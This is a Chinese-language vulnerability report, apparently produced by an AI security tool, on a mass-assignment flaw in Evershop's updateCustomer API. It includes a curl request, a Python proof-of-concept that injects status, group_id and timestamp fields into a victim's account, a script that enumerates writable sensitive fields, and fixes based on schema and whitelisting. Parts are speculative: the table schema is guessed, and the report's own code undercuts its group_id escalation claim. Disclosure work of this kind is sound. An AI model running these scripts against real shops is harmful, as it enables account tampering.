# Evershop updateCustomer Mass Assignment 漏洞报告

## 1. 漏洞挖掘目标

- **受影响系统/产品**：Evershop E-commerce Platform
- **受影响版本**：2.1.0 及之前版本
- **仓库地址**：https://github.com/evershopcommerce/evershop

## 2. 漏洞说明

### 2.1 漏洞描述

- **漏洞类型**：批量赋值 (Mass Assignment, CWE-915)
- **漏洞名称**：Evershop updateCustomer API 批量赋值导致权限提升漏洞
- **风险等级**：高危
- **概述**：`updateCustomer` API 的请求验证Schema配置了 `additionalProperties: true`，且Handler直接使用展开运算符将 `request.body` 传入数据库更新操作。攻击者可在请求中注入任意字段（如 `status`、`is_admin` 等），修改本不应被用户控制的敏感属性。

### 2.2 利用前提与特征

- **利用难度**：低
- **权限要求**：取决于 VULN-003（当前无需认证）
- **操作条件**：
  1. 知道目标用户UUID
  2. 知道数据库表中存在的敏感字段名
- **攻击特征**：在正常请求字段外添加额外的键值对

### 2.3 漏洞效果

漏洞攻击成功后的效果如下：

1. **账户状态篡改**：修改 `status` 字段激活/禁用账户
2. **权限提升**：可能修改 `group_id` 或其他权限相关字段
3. **数据完整性破坏**：修改 `created_at`、`updated_at` 等时间戳
4. **业务逻辑绕过**：修改任何未被明确保护的字段

## 3. 漏洞复现

- **是否可以制作成自动化复现脚本**：是

### 3.1 漏洞复现过程

**步骤1：分析请求验证Schema**

文件：`packages/evershop/src/modules/customer/api/updateCustomer/payloadSchema.json`
```json
{
  "type": "object",
  "properties": {
    "email": { "type": "string", "format": "email" },
    "password": { "type": "string" },
    "full_name": { "type": "string" }
  },
  "additionalProperties": true  // <-- 允许任意额外字段！
}
```

**步骤2：分析Handler代码**

```javascript
// updateCustomer.js
await update('customer')
  .given({
    ...request.body,  // <-- 直接展开所有请求字段
    group_id: 1
  })
  .where('uuid', '=', request.params.id)
  .execute(connection, false);
```

**步骤3：查看customer表结构**

```sql
-- 推测的customer表结构
CREATE TABLE customer (
  customer_id SERIAL PRIMARY KEY,
  uuid VARCHAR(32),
  email VARCHAR(255),
  password VARCHAR(255),
  full_name VARCHAR(255),
  status BOOLEAN DEFAULT true,  -- 敏感字段
  group_id INT,                  -- 敏感字段
  created_at TIMESTAMP,
  updated_at TIMESTAMP
);
```

**步骤4：发送包含额外字段的请求**

```bash
curl -X PATCH 'https://target.com/api/customers/victim-uuid' \
  -H 'Content-Type: application/json' \
  -d '{
    "full_name": "Normal Update",
    "status": false,
    "created_at": "2020-01-01 00:00:00"
  }'
```

## 4. 漏洞利用

- **是否可以制作成自动化复现脚本**：是

### 4.1 利用脚本

```python
#!/usr/bin/env python3
"""
Evershop Mass Assignment PoC
"""

import requests

def mass_assignment_exploit(target_url, victim_uuid):
    """
    通过Mass Assignment注入敏感字段
    """
    endpoint = f"{target_url}/api/customers/{victim_uuid}"

    # 注入多个敏感字段
    payload = {
        "full_name": "Legitimate Update",  # 正常字段
        # 以下为注入的敏感字段
        "status": False,           # 禁用账户
        "group_id": 999,           # 尝试修改用户组
        "created_at": "2000-01-01 00:00:00"  # 修改创建时间
    }

    response = requests.patch(endpoint, json=payload)

    print(f"Status Code: {response.status_code}")
    print(f"Response: {response.json()}")

    return response

if __name__ == "__main__":
    mass_assignment_exploit("https://shop.example.com", "target-uuid")
```

### 4.2 字段枚举脚本

```python
def enumerate_writable_fields(target_url, uuid, field_list):
    """
    枚举哪些字段可以被写入
    """
    writable = []

    for field in field_list:
        payload = {field: "test_value_12345"}

        response = requests.patch(
            f"{target_url}/api/customers/{uuid}",
            json=payload
        )

        if response.status_code == 200:
            # 检查字段是否真的被更新
            get_response = requests.get(f"{target_url}/api/customers/{uuid}")
            if "test_value_12345" in get_response.text:
                writable.append(field)
                print(f"[+] {field}: WRITABLE")
            else:
                print(f"[~] {field}: Accepted but not reflected")
        else:
            print(f"[-] {field}: Rejected")

    return writable

# 常见敏感字段列表
COMMON_FIELDS = [
    'status', 'is_active', 'is_admin', 'role', 'roles',
    'group_id', 'user_group', 'permissions',
    'balance', 'credit', 'points',
    'verified', 'email_verified', 'is_verified',
    'created_at', 'updated_at', 'deleted_at'
]
```

## 5. 漏洞原理

### 5.1 数据流分析

```
┌────────────────────────────────────────────────────────────────┐
│                Mass Assignment 数据流                          │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  HTTP请求 Body:                                                │
│  {                                                             │
│    "full_name": "John",     // 预期字段                        │
│    "status": false,         // 注入的敏感字段                   │
│    "group_id": 999          // 注入的敏感字段                   │
│  }                                                             │
│            │                                                   │
│            ▼                                                   │
│  ┌─────────────────────────────────────────┐                  │
│  │ payloadSchema.json 验证                 │                  │
│  │                                         │                  │
│  │ "additionalProperties": true            │                  │
│  │  → 允许所有额外字段通过验证              │                  │
│  └─────────────────────────────────────────┘                  │
│            │                                                   │
│            ▼                                                   │
│  ┌─────────────────────────────────────────┐                  │
│  │ updateCustomer.js                       │                  │
│  │                                         │                  │
│  │ update('customer').given({              │                  │
│  │   ...request.body,  ← 所有字段展开       │                  │
│  │   group_id: 1       ← 仅此字段被覆盖     │                  │
│  │ })                                      │                  │
│  └─────────────────────────────────────────┘                  │
│            │                                                   │
│            ▼                                                   │
│  ┌─────────────────────────────────────────┐                  │
│  │ postgres-query-builder                  │                  │
│  │                                         │                  │
│  │ 生成SQL:                                │                  │
│  │ UPDATE customer SET                     │                  │
│  │   full_name = 'John',                   │                  │
│  │   status = false,    ← 敏感字段被更新!   │                  │
│  │   group_id = 1       ← 被硬编码覆盖      │                  │
│  │ WHERE uuid = 'xxx'                      │                  │
│  └─────────────────────────────────────────┘                  │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

### 5.2 根因分析

1. **Schema配置宽松**：`additionalProperties: true` 允许任意额外字段
2. **无字段白名单**：Handler未过滤请求中的非预期字段
3. **ORM直接映射**：展开运算符将所有字段传入数据库操作

## 6. 修复建议

### 6.1 方案A：修改Schema配置

```json
{
  "type": "object",
  "properties": {
    "email": { "type": "string", "format": "email" },
    "password": { "type": "string" },
    "full_name": { "type": "string" }
  },
  "additionalProperties": false  // <-- 拒绝额外字段
}
```

### 6.2 方案B：实现字段白名单（推荐）

```javascript
// updateCustomer.js
const ALLOWED_FIELDS = ['email', 'password', 'full_name'];

export default async (request, response, next) => {
  // 过滤请求体，只保留允许的字段
  const filteredBody = {};
  ALLOWED_FIELDS.forEach(field => {
    if (request.body[field] !== undefined) {
      filteredBody[field] = request.body[field];
    }
  });

  // 密码哈希
  if (filteredBody.password) {
    filteredBody.password = hashPassword(filteredBody.password);
  }

  await update('customer')
    .given(filteredBody)  // 使用过滤后的数据
    .where('uuid', '=', request.params.id)
    .execute(connection, false);
  // ...
};
```

### 6.3 方案C：使用DTO类

```typescript
// customerUpdateDto.ts
class CustomerUpdateDto {
  email?: string;
  password?: string;
  full_name?: string;

  static fromRequest(body: any): CustomerUpdateDto {
    const dto = new CustomerUpdateDto();
    if (body.email) dto.email = body.email;
    if (body.password) dto.password = body.password;
    if (body.full_name) dto.full_name = body.full_name;
    return dto;
  }

  toDbObject(): Record<string, any> {
    const obj: Record<string, any> = {};
    if (this.email) obj.email = this.email;
    if (this.password) obj.password = hashPassword(this.password);
    if (this.full_name) obj.full_name = this.full_name;
    return obj;
  }
}

// 使用
const dto = CustomerUpdateDto.fromRequest(request.body);
await update('customer').given(dto.toDbObject()).execute(connection);
```

---

**报告编写日期**：2026-01-04
**分析师**：Claude Code Security Analyzer
